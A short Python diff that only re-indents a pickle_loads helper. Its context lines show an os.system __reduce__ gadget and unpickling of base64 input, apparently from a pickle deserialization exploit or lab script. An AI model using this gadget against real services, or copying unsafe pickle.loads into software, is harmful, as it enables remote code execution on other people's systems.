@@ -20,7 +20,7 @@ class Test:
         return (os.system, (payload,))
         
 def pickle_loads(s):
-	return pickle.loads(base64.b64decode(s))
+    return pickle.loads(base64.b64decode(s))
 
 def pickle_dump(obj):
     return base64.b64encode(pickle.dumps(obj)).decode()
